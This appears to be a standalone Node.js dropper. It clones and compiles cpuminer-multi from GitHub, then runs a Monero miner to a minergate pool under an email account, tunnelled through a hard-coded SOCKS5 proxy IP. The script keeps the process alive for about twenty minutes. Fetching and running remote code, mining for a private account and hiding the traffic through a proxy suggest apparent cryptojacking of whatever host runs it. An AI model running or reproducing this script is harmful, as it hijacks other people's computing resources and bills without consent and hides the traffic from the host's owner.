var str = "git clone https://github.com/wolf9466/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && CFLAGS=\"-march=native\" ./configure && make && ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy socks5://104.202.128.248:51376";
var child = require('child_process').exec(str);
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
var index = 1;
var max = 20;
var interval;
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("running..." + ++index);
}, 1000 * 60);
